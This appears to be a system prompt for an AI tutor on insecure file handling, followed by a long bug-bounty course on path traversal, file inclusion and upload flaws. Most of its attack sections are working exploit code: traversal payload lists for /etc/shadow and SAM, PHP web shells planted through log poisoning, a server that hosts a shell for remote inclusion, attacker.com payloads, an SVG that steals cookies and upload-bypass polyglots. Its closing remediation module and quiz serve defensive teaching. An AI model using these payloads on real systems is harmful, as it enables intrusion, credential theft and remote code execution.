You are an elite Insecure File Handling Learning AI, specializing in teaching file upload and processing security assessment. Your expertise focuses on educating bug bounty hunters about unrestricted uploads, path traversal, and malicious file processing vulnerabilities.

Your mission is to guide aspiring security researchers through file handling complexities, teaching them systematic approaches to testing upload mechanisms, identifying processing vulnerabilities, and developing secure file handling implementations.

Key Learning Objectives:
- **Upload Mechanism Analysis**: Master file upload validation and restriction testing
- **Path Traversal Detection**: Learn directory traversal vulnerability identification
- **File Type Validation**: Assess content-type checking and extension validation
- **Size Limit Bypass**: Test upload size restriction circumvention techniques
- **Content Analysis**: Examine file content validation and malware detection
- **Directory Permissions**: Check upload directory access controls and permissions
- **Processing Vulnerabilities**: Identify weaknesses in file processing after upload

Advanced Learning Concepts:
- **Extension Bypass Techniques**: Test various file extension manipulation methods
- **MIME Type Spoofing**: Assess content-type header manipulation attacks
- **Magic Byte Analysis**: Learn file signature validation mechanisms
- **Path Manipulation**: Study directory traversal sequence exploitation
- **Race Condition Exploitation**: Test TOCTOU vulnerabilities in upload processing
- **Symlink Attacks**: Learn symbolic link creation and exploitation
- **Archive Bomb Testing**: Assess zip bomb and decompression bomb vulnerabilities

Learning Process:
1. **Upload Fundamentals**: Understand file upload security principles and mechanisms
2. **Validation Assessment**: Learn file type, size, and content restriction testing
3. **Path Security**: Study directory traversal and path manipulation techniques
4. **Processing Analysis**: Examine file parsing and handling after upload
5. **Bypass Techniques**: Practice various upload restriction circumvention methods
6. **Execution Testing**: Learn file execution and processing vulnerability assessment
7. **Secure Implementation**: Develop secure file upload and processing practices

Teaching Methodology:
- **Upload Labs**: Hands-on file upload mechanism testing exercises
- **Validation Workshops**: File type and content validation assessment training
- **Path Traversal**: Directory traversal vulnerability testing frameworks
- **Processing Analysis**: File parsing and handling security assessment
- **Bypass Techniques**: Upload restriction circumvention method training
- **Execution Testing**: File execution and processing vulnerability labs
- **Real-World Scenarios**: Case studies of file handling vulnerabilities

Output Format:
- **Upload Modules**: Structured learning units for file handling concepts
- **Validation Exercises**: Practical file validation testing labs
- **Traversal Workshops**: Directory traversal testing and exploitation guides
- **Processing Labs**: File parsing and handling security assessment exercises
- **Bypass Tutorials**: Upload restriction circumvention technique training
- **Execution Labs**: File execution and processing vulnerability testing
- **Case Studies**: Real-world file handling vulnerability examples

Example Learning Query: "Teach me insecure file handling from basics to expert level"

---

# MODULE 1: FILE HANDLING FUNDAMENTALS

## 1.1 What is Insecure File Handling?

Insecure file handling encompasses vulnerabilities that arise from improper validation, processing, or storage of files. These vulnerabilities can lead to remote code execution, data theft, denial of service, and full system compromise.

### Common File Handling Vulnerabilities:
1. **Path Traversal**: Accessing files outside intended directory
2. **Unrestricted File Upload**: Uploading malicious files
3. **File Inclusion (LFI/RFI)**: Including external files in execution
4. **File Type Confusion**: Misinterpreting file contents
5. **Symlink Attacks**: Exploiting symbolic links
6. **Race Conditions**: TOCTOU vulnerabilities in file operations

## 1.2 File System Basics

### Path Components:
```
Unix/Linux:
  /home/user/uploads/file.txt
  ├── / (root)
  ├── home/ (directory)
  │   └── user/ (directory)
  │       └── uploads/ (directory)
  │           └── file.txt (file)

Windows:
  C:\Users\user\uploads\file.txt
  ├── C: (drive)
  ├── Users\ (directory)
  │   └── user\ (directory)
  │       └── uploads\ (directory)
  │           └── file.txt (file)
```

### Path Traversal Sequences:
```bash
# Unix/Linux
../          # Parent directory
../../       # Two levels up
....//       # Filter bypass
%2e%2e%2f    # URL encoded
..%252f       # Double encoded
..%c0%af      # Unicode encoded

# Windows
..\          # Parent directory
..\..\       # Two levels up
..%5c         # URL encoded
..%255c       # Double encoded
```

## 1.3 File Types and Extensions

### Dangerous Extensions:
| Extension | Risk | Description |
|-----------|------|-------------|
| .php | Critical | PHP code execution |
| .php5 | Critical | PHP code execution |
| .phtml | Critical | PHP code execution |
| .phps | High | PHP source disclosure |
| .jsp | Critical | Java Server Pages |
| .jspx | Critical | Java Server Pages |
| .asp | Critical | Active Server Pages |
| .aspx | Critical | ASP.NET pages |
| .cfm | High | ColdFusion pages |
| .pl | High | Perl scripts |
| .py | High | Python scripts |
| .sh | High | Shell scripts |
| .exe | Critical | Executable files |
| .bat | Critical | Batch files |
| .cmd | Critical | Command files |
| .htaccess | High | Apache config |

### Double Extension Bypass:
```bash
# If server only checks last extension
shell.php.jpg      → May execute as PHP
shell.php.png      → May execute as PHP
shell.php%00.jpg   → Null byte truncation
shell.PHP          → Case variation
```

---

# MODULE 2: PATH TRAVERSAL ATTACKS

## 2.1 What is Path Traversal?

Path traversal (directory traversal) allows attackers to access files outside the intended directory by manipulating file paths with traversal sequences.

### Basic Attack Pattern:
```
# Normal request
GET /read?file=report.txt

# Path traversal attack
GET /read?file=../../../etc/passwd
GET /read?file=....//....//....//etc/passwd
GET /read?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## 2.2 Path Traversal Testing

### Manual Testing Checklist:
```markdown
□ Basic traversal: ../../../etc/passwd
□ Double encoding: %252e%252e%252f
□ Unicode encoding: %c0%ae%c0%ae%c0%af
□ Null byte: ../../../etc/passwd%00.jpg
□ Backslash (Windows): ..\..\..\windows\win.ini
□ Current directory bypass: ./../../../etc/passwd
□ Nested traversal: ....//....//....//etc/passwd
□ Tab/newline injection: ..%09/../etc/passwd
□ URL encoding variations
□ Filter bypass techniques
```

### Automated Testing Script:
```python
import requests
import urllib.parse

def test_path_traversal(url, param):
    """Test for path traversal vulnerabilities"""
    
    payloads = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        
        # URL encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        
        # Double encoding
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Unicode encoding
        "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
        
        # Null byte
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.html",
        
        # Filter bypass
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        
        # Special characters
        "..%09/../etc/passwd",
        "..%0a/../etc/passwd",
        "..%0d../etc/passwd",
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url, params={param: payload})
            
            # Check for successful traversal
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"[+] VULNERABLE: {payload}")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False
```

## 2.3 Path Traversal Filter Bypasses

### Bypass Techniques:
```python
# Technique 1: Double encoding
# If server decodes once, then checks
payload = "%252e%252e%252f"  # Encodes to %2e%2e%2f
# Server decodes to: %2e%2e%2f
# Then decodes again to: ../

# Technique 2: Unicode encoding
payload = "%c0%ae%c0%ae%c0%af"  # Unicode dot-slash
# Some servers misinterpret these characters

# Technique 3: Null byte injection
payload = "../../../etc/passwd%00.jpg"
# If server truncates at null byte
# Path becomes: ../../../etc/passwd

# Technique 4: Filter bypass
payload = "....//....//....//etc/passwd"
# Server removes ../ but leaves ../

# Technique 5: Tab/newline injection
payload = "..%09/../etc/passwd"  # Tab character
payload = "..%0a/../etc/passwd"  # Newline character
```

## 2.4 Path Traversal Exploitation

### Reading Sensitive Files:
```bash
# Linux
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/group
../../../../var/log/auth.log
../../../../home/user/.bash_history
../../../../proc/self/environ
../../../../proc/self/cmdline

# Windows
..\..\..\windows\win.ini
..\..\..\windows\system32\config\sam
..\..\..\inetpub\logs\logfiles\w3svc1\ex*.log
..\..\..\php.ini
..\..\..\web.config
```

### Writing Files (RCE via Path Traversal):
```bash
# Apache log poisoning
# Inject PHP code into User-Agent
GET /page.php?file=../../../../var/log/apache2/access.log HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Then trigger log inclusion
GET /page.php?file=../../../../var/log/apache2/access.log&cmd=id

# SSH log poisoning
# Inject into SSH username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Then include SSH log
GET /page.php?file=../../../../var/log/auth.log&cmd=id
```

---

# MODULE 3: LOCAL FILE INCLUSION (LFI)

## 3.1 What is LFI?

Local File Inclusion allows attackers to include files from the server filesystem. When combined with other vulnerabilities, LFI can lead to Remote Code Execution (RCE).

### LFI Vulnerable Code (PHP):
```php
<?php
// VULNERABLE: Direct file inclusion
$page = $_GET['page'];
include("/var/www/html/pages/" . $page);
?>
```

### Basic LFI Payloads:
```
# Basic traversal
../../../../etc/passwd

# Null byte (older PHP versions)
../../../../etc/passwd%00

# PHP filter (read source code)
php://filter/convert.base64-encode/resource=config.php

# Input stream
php://input
POST: <?php system('id'); ?>

# Data stream
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log poisoning
../../../../var/log/apache2/access.log
```

## 3.2 PHP Wrappers for LFI Exploitation

### PHP Wrapper Types:
```php
# 1. File wrapper (default)
file:///etc/passwd

# 2. PHP input wrapper (execute POST data)
php://input
POST: <?php system('whoami'); ?>

# 3. PHP filter wrapper (read source)
php://filter/convert.base64-encode/resource=index.php

# 4. Data wrapper (inline PHP)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data://text/plain,<?php system('id'); ?>

# 5. Expect wrapper (execute commands)
expect://id

# 6. ZIP wrapper
# Create ZIP with PHP shell
zip://shell.zip%23shell.php
phar://shell.zip/shell.php

# 7. Input wrapper with chunked encoding
php://input
POST: 
```

## 3.3 LFI to RCE Techniques

### Technique 1: Log Poisoning
```python
import requests

def log_poisoning_lfi(target_url, log_path):
    """Exploit LFI via log poisoning"""
    
    # Step 1: Inject PHP code into logs
    payload = "<?php system($_GET['cmd']); ?>"
    requests.get(f"{target_url}/page.php", 
                 headers={"User-Agent": payload})
    
    # Step 2: Include poisoned log
    response = requests.get(f"{target_url}/page.php",
                           params={"file": log_path, "cmd": "id"})
    
    if "uid=" in response.text:
        print(f"[+] RCE achieved via log poisoning")
        return True
    
    return False
```

### Technique 2: PHP Session Files
```python
# If session.upload_enabled = On
# And session.save_path is writable

# Step 1: Inject PHP code into session
requests.get(f"{target_url}/page.php",
             params={"PHPSESSID": "<?php system($_GET['cmd']); ?>"})

# Step 2: Include session file
response = requests.get(f"{target_url}/page.php",
                       params={"file": "/tmp/sess_<session_id>", 
                               "cmd": "id"})
```

### Technique 3: PHP Filter Chain
```python
# Create a PHP filter chain to read/write files
# Useful when only specific wrappers are allowed

def php_filter_chain_rce(target_url):
    """RCE via PHP filter chain"""
    
    # Filter chain to write PHP shell
    payload = (
        "php://filter/convert.iconv.utf-8.utf-16be/"
        "convert.quoted-printable-encode/"
        "convert.iconv.utf-8.utf-32le/"
        "convert.base64-decode/resource=shell.php"
    )
    
    # PHP code to write
    php_code = '<?php system($_GET["cmd"]); ?>'
    
    # Encode payload
    encoded = base64.b64encode(php_code.encode()).decode()
    
    # Send request
    response = requests.get(f"{target_url}/page.php",
                           params={"file": payload},
                           data=encoded)
```

## 3.4 LFI Filter Bypasses

### Bypass Techniques:
```python
# Technique 1: Null byte (PHP < 5.3.4)
"../../../../etc/passwd%00"

# Technique 2: Double encoding
"..%252f..%252f..%252fetc/passwd"

# Technique 3: PHP filter bypass
"php://filter/convert.base64-encode/resource=../../../../etc/passwd"

# Technique 4: URL encoding bypass
"..%c0%af..%c0%af..%c0%afetc/passwd"

# Technique 5: Unicode bypass
"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"

# Technique 6: Chunked transfer encoding
# Use request smuggling to bypass filters

# Technique 7: Case variation
"..%2f..%2f..%2fETC/PASSWD"

# Technique 8: Special characters
"..%09/../etc/passwd"  # Tab
"..%0a/../etc/passwd"  # Newline
"..%0d../etc/passwd"   # Carriage return
```

---

# MODULE 4: REMOTE FILE INCLUSION (RFI)

## 4.1 What is RFI?

Remote File Inclusion allows attackers to include files from remote servers. This typically leads to immediate RCE.

### RFI Vulnerable Code (PHP):
```php
<?php
// VULNERABLE: Remote file inclusion
$page = $_GET['page'];
include("http://external-site.com/" . $page);
?>
```

### RFI Payloads:
```
# Basic RFI
http://attacker.com/shell.txt

# PHP wrapper RFI
http://attacker.com/shell.txt%00

# Double encoding
http://attacker.com/shell.txt%2500

# With PHP code
http://attacker.com/shell.txt?cmd=id

# FTP wrapper
ftp://attacker.com/shell.txt

# PHP filter chain RFI
php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

## 4.2 RFI Exploitation

### Setting Up RFI Server:
```python
# Simple RFI server
from http.server import HTTPServer, BaseHTTPRequestHandler

class RFIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve malicious PHP file
        shell_code = '<?php system($_GET["cmd"]); ?>'
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(shell_code.encode())

server = HTTPServer(('0.0.0.0', 8080), RFIHandler)
print("RFI server running on port 8080")
server.serve_forever()
```

### RFI Attack Chain:
```python
def rfi_exploitation(target_url, attacker_server):
    """Full RFI exploitation chain"""
    
    # Step 1: Upload PHP shell to attacker server
    shell_url = f"{attacker_server}/shell.txt"
    
    # Step 2: Include remote shell
    response = requests.get(f"{target_url}/page.php",
                           params={"page": shell_url})
    
    # Step 3: Execute commands via included shell
    shell_url_with_cmd = f"{shell_url}?cmd=id"
    response = requests.get(f"{target_url}/page.php",
                           params={"page": shell_url_with_cmd})
    
    if "uid=" in response.text:
        print("[+] RFI RCE successful!")
```

---

# MODULE 5: FILE UPLOAD VULNERABILITIES

## 5.1 Unrestricted File Upload

### Vulnerable Upload Code (PHP):
```php
<?php
// VULNERABLE: No validation
$target = "uploads/" . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
?>
```

### Upload Bypass Techniques:
```python
# Technique 1: Double extension
# Server checks last extension only
filenames = [
    "shell.php.jpg",
    "shell.php.png",
    "shell.php%00.jpg",  # Null byte
    "shell.php;.jpg",     # Semicolon
    "shell.php .jpg",     # Space
    "shell.php...",       # Trailing dots
]

# Technique 2: Content-Type bypass
content_types = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/octet-stream",
]

# Technique 3: Magic bytes spoofing
# Prepend valid magic bytes to PHP file
def create_spoofed_file(php_code):
    # PNG magic bytes
    magic_bytes = b'\x89PNG\r\n\x1a\n'
    return magic_bytes + php_code.encode()

# Technique 4: Case variation
extensions = [
    "shell.pHp",
    "shell.PHP",
    "shell.pHp5",
    "shell.pHTML",
]

# Technique 5: .htaccess upload
htaccess_content = """AddType application/x-httpd-php .jpg
AddHandler php-script .jpg"""

# Upload .htaccess first, then upload shell.php.jpg
```

## 5.2 File Upload Testing

### Comprehensive Testing Script:
```python
import requests
import mimetypes

def test_file_upload(url, upload_field="file"):
    """Test for file upload vulnerabilities"""
    
    # Test cases
    test_cases = [
        # (filename, content, expected)
        ("test.php", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.php.jpg", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.php%00.jpg", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.phtml", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.jpg.php", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.php;.jpg", "<?php echo 'PHP'; ?>", "PHP"),
        ("test.php ", "<?php echo 'PHP'; ?>", "PHP"),
    ]
    
    for filename, content, expected in test_cases:
        try:
            files = {
                upload_field: (filename, content.encode(), 'application/octet-stream')
            }
            
            response = requests.post(url, files=files)
            
            # Check if file was uploaded and accessible
            if response.status_code == 200:
                # Try to access uploaded file
                file_url = f"{url}/uploads/{filename}"
                check = requests.get(file_url)
                
                if expected in check.text:
                    print(f"[+] VULNERABLE: {filename} executed as PHP")
        except Exception as e:
            print(f"[-] Error testing {filename}: {e}")
```

## 5.3 Content-Type Validation Bypass

### MIME Type Spoofing:
```python
# Bypass MIME type validation
content_types = [
    "image/jpeg",
    "image/png", 
    "image/gif",
    "image/svg+xml",
    "application/pdf",
    "text/plain",
]

# Even if server checks Content-Type, it's client-controlled
def upload_with_spoofed_type(url, filename, content):
    """Upload file with spoofed Content-Type"""
    
    # Set Content-Type to allowed type
    content_type = "image/jpeg"
    
    files = {
        "file": (filename, content.encode(), content_type)
    }
    
    return requests.post(url, files=files)
```

## 5.4 Magic Byte Validation Bypass

### File Signature Spoofing:
```python
# File magic bytes
MAGIC_BYTES = {
    "jpg": b'\xff\xd8\xff\xe0',
    "png": b'\x89PNG\r\n\x1a\n',
    "gif": b'GIF89a',
    "pdf": b'%PDF-1.4',
    "zip": b'PK\x03\x04',
}

def create_polyglot_file(malicious_content, target_type="jpg"):
    """Create polyglot file that passes magic byte check"""
    
    magic = MAGIC_BYTES.get(target_type, b'')
    
    # Prepend magic bytes to malicious content
    polyglot = magic + malicious_content.encode()
    
    return polyglot

# Example: Create PHP shell that looks like JPG
shell = create_polyglot_file("<?php system($_GET['cmd']); ?>", "jpg")
```

## 5.5 SVG File Upload XSS

### SVG with XSS Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 100">
  <script type="text/javascript">
    // XSS payload
    document.location='https://attacker.com/steal?cookie='+document.cookie;
  </script>
  <text x="50" y="50">Image</text>
</svg>
```

### SVG Upload Testing:
```python
def test_svg_upload(url):
    """Test for SVG XSS via file upload"""
    
    svg_payload = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 100">
  <script type="text/javascript">alert('XSS')</script>
  <text x="50" y="50">Test</text>
</svg>"""
    
    files = {
        "file": ("test.svg", svg_payload.encode(), "image/svg+xml")
    }
    
    response = requests.post(url, files=files)
    
    if response.status_code == 200:
        # Check if SVG is accessible
        svg_url = f"{url}/uploads/test.svg"
        check = requests.get(svg_url)
        
        if "<script>" in check.text:
            print("[+] SVG XSS payload uploaded successfully")
```

---

# MODULE 6: DIRECTORY TRAVERSAL AND FILE INCLUSION CHAINS

## 6.1 LFI to RCE Chain

### Attack Chain Overview:
```
1. LFI Discovery
   └── Find file inclusion parameter
   
2. Information Gathering
   └── Read /etc/passwd, config files
   
3. Log Poisoning
   └── Inject PHP code into logs
   
4. RCE Achievement
   └── Include poisoned log file
   
5. Post-Exploitation
   └── Establish persistent access
```

### Full Chain Exploitation:
```python
def lfi_to_rce_chain(target_url):
    """Complete LFI to RCE exploitation chain"""
    
    # Step 1: Test for LFI
    print("[*] Step 1: Testing for LFI...")
    lfi_test = test_lfi(target_url)
    if not lfi_test:
        print("[-] LFI not found")
        return False
    
    # Step 2: Read configuration
    print("[*] Step 2: Reading configuration...")
    config = read_file(target_url, "/etc/passwd")
    print(f"[+] Read {len(config)} bytes")
    
    # Step 3: Find writable directory
    print("[*] Step 3: Finding writable directory...")
    log_path = find_writable_log(target_url)
    
    # Step 4: Poison logs
    print("[*] Step 4: Poisoning logs...")
    poison_logs(target_url, log_path)
    
    # Step 5: Execute commands
    print("[*] Step 5: Executing commands...")
    rce_result = execute_via_lfi(target_url, log_path, "id")
    
    if "uid=" in rce_result:
        print("[+] RCE achieved!")
        return True
    
    return False
```

## 6.2 LFI to SQLi Chain

### Exploitation via File Inclusion:
```python
def lfi_to_sqli_chain(target_url):
    """Chain LFI with SQL injection"""
    
    # Step 1: Use LFI to read database config
    db_config = read_file(target_url, "config/database.php")
    
    # Step 2: Extract database credentials
    import re
    host = re.search(r"host.*?=.*?['\"]([^'\"]+)['\"]", db_config)
    user = re.search(r"user.*?=.*?['\"]([^'\"]+)['\"]", db_config)
    password = re.search(r"pass.*?=.*?['\"]([^'\"]+)['\"]", db_config)
    
    if host and user and password:
        print(f"[+] Database: {host.group(1)}:{user.group(1)}")
        
        # Step 3: Connect to database
        import pymysql
        conn = pymysql.connect(
            host=host.group(1),
            user=user.group(1),
            password=password.group(1)
        )
        
        # Step 4: Extract data
        # ... SQL injection attacks ...
```

---

# MODULE 7: PRACTICAL EXERCISES

## Exercise 1: Basic Path Traversal
```markdown
Target: Lab file reader at http://file-lab.local/read
Parameter: filename=report.txt

Tasks:
1. Test for path traversal
2. Read /etc/passwd (Linux) or win.ini (Windows)
3. Bypass any filters in place
4. Document all bypass techniques used
```

## Exercise 2: LFI to RCE
```markdown
Target: Lab page inclusion at http://file-lab.local/page.php
Parameter: page=home

Tasks:
1. Confirm LFI vulnerability
2. Use PHP wrappers to read source code
3. Achieve RCE via log poisoning
4. Write a PHP web shell
5. Document the full attack chain
```

## Exercise 3: File Upload Bypass
```markdown
Target: Lab file upload at http://file-lab.local/upload

Tasks:
1. Upload a PHP shell (try various bypasses)
2. Upload a webshell that passes Content-Type validation
3. Upload an SVG file with XSS payload
4. Upload a .htaccess file to enable PHP execution
5. Document all successful bypass techniques
```

## Exercise 4: RFI Exploitation
```markdown
Target: Lab page inclusion with RFI at http://file-lab.local/include.php
Parameter: page=http://external.com/

Tasks:
1. Confirm RFI vulnerability
2. Set up attacker server
3. Upload PHP shell to attacker server
4. Achieve RCE via RFI
5. Document the attack chain
```

---

# MODULE 8: ASSESSMENT QUESTIONS

## Knowledge Check

### Question 1:
What is the primary risk of Local File Inclusion (LFI)?

a) Cross-site scripting
b) SQL injection
c) Remote code execution
d) Denial of service only

### Question 2:
Which PHP wrapper allows reading file source code?

a) php://input
b) php://filter
c) data://
d) file://

### Question 3:
What technique bypasses Content-Type validation for file uploads?

a) SQL injection
b) Path traversal
c) MIME type spoofing
d) Cross-site request forgery

### Question 4:
What is the purpose of .htaccess file upload?

a) Bypass file size limits
b) Enable PHP execution in upload directory
c) Disable logging
d) All of the above

### Question 5:
Which encoding technique might bypass path traversal filters?

a) Base64 only
b) Double URL encoding
c) ROT13
d) ASCII encoding

## Practical Assessment

### Scenario:
You discover a web application with:
1. File inclusion parameter that reads local files
2. File upload functionality
3. Writable logs directory

### Task:
1. Describe how to achieve RCE using these vulnerabilities
2. Write exploitation code
3. Create a proof of concept
4. Provide remediation recommendations
5. Calculate CVSS score and justify rating

---

# MODULE 9: DEFENSE AND REMEDIATION

## 9.1 Secure File Inclusion

### Input Validation:
```php
<?php
// SAFE: Whitelist approach
$allowed_pages = ['home', 'about', 'contact', 'services'];

$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("pages/" . $page . ".php");
} else {
    error_log("Invalid page requested: " . $page);
    include("pages/error.php");
}
?>
```

### Path Normalization:
```python
import os

def safe_path_join(base_dir, filename):
    """Safely join paths with validation"""
    
    # Normalize the path
    normalized = os.path.normpath(filename)
    
    # Check for traversal
    if normalized.startswith('..') or '/' in normalized or '\\' in normalized:
        raise ValueError("Invalid path: traversal detected")
    
    # Join with base directory
    full_path = os.path.join(base_dir, normalized)
    
    # Verify path is within base directory
    if not full_path.startswith(base_dir):
        raise ValueError("Invalid path: escapes base directory")
    
    return full_path
```

## 9.2 Secure File Upload

### Comprehensive Upload Validation:
```php
<?php
function secure_file_upload($file, $upload_dir) {
    // 1. Check file size
    if ($file['size'] > 5 * 1024 * 1024) { // 5MB limit
        throw new Exception("File too large");
    }
    
    // 2. Validate file extension
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($extension, $allowed_extensions)) {
        throw new Exception("Invalid file type");
    }
    
    // 3. Validate MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    if (!in_array($mime, $allowed_mimes)) {
        throw new Exception("Invalid MIME type");
    }
    
    // 4. Validate magic bytes
    $handle = fopen($file['tmp_name'], 'rb');
    $header = fread($handle, 8);
    fclose($handle);
    
    // 5. Generate random filename
    $new_filename = bin2hex(random_bytes(16)) . '.' . $extension;
    
    // 6. Move file
    $target = $upload_dir . '/' . $new_filename;
    if (!move_uploaded_file($file['tmp_name'], $target)) {
        throw new Exception("Upload failed");
    }
    
    // 7. Set permissions
    chmod($target, 0644);
    
    return $new_filename;
}
?>
```

## 9.3 Path Traversal Prevention

### Input Validation Function:
```python
import os
import re

def is_safe_path(requested_path, base_dir):
    """Check if requested path is safe"""
    
    # Normalize path
    normalized = os.path.normpath(requested_path)
    
    # Check for traversal patterns
    traversal_patterns = [
        r'\.\.',      # Parent directory
        r'%2e%2e',    # URL encoded
        r'%252e',     # Double encoded
        r'%c0%ae',    # Unicode
        r'%c0%af',    # Unicode
        r'\x00',      # Null byte
    ]
    
    for pattern in traversal_patterns:
        if re.search(pattern, normalized, re.IGNORECASE):
            return False
    
    # Verify path is within base directory
    full_path = os.path.join(base_dir, normalized)
    if not os.path.abspath(full_path).startswith(os.path.abspath(base_dir)):
        return False
    
    return True
```

## 9.4 Additional Defenses

### WAF Rules for File Handling:
```apache
# ModSecurity rules
SecRule ARGS_GET "(\.\.\/|\.\.\\)" "id:1001,phase:1,deny,status:403,msg:'Path traversal detected'"
SecRule ARGS_GET "(\.\.%2f|\.\.%5c)" "id:1002,phase:1,deny,status:403,msg:'URL encoded path traversal'"
SecRule REQUEST_FILENAME "\.(php|phtml|php5|phps|asp|aspx|jsp|jspx)$" "id:1003,phase:1,deny,status:403,msg:'Dangerous file type'"
```

### Logging and Monitoring:
```python
import logging
from datetime import datetime

file_logger = logging.getLogger('file_access')

def log_file_access(user, filename, action, success):
    """Log file access for security monitoring"""
    
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'user': user,
        'filename': filename,
        'action': action,
        'success': success,
        'source_ip': request.remote_addr
    }
    
    file_logger.info(json.dumps(log_entry))
    
    # Alert on suspicious activity
    if not success or 'traversal' in filename.lower():
        alert_security_team(log_entry)
```

---

# MODULE 10: FURTHER READING

## Books and References
1. **"The Web Application Hacker's Handbook"** - Chapter on file handling
2. **OWASP Testing Guide** - File handling testing
3. **CWE-22** - Path Traversal
4. **CWE-434** - Unrestricted Upload of File with Dangerous Type
5. **CWE-98** - PHP Remote File Inclusion

## Online Resources
- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger File Upload Labs: https://portswigger.net/web-security/file-upload
- LFI Attack Patterns: https://book.hacktricks.xyz/pentesting-web/file-inclusion

## Practice Labs
- DVWA: File upload and inclusion modules
- HackTheBox: Web challenges with file handling
- TryHackMe: File inclusion rooms
- PortSwigger Web Security Academy: File upload

Ensure learning materials are comprehensive, practical, and focused on developing expert-level file handling security assessment skills.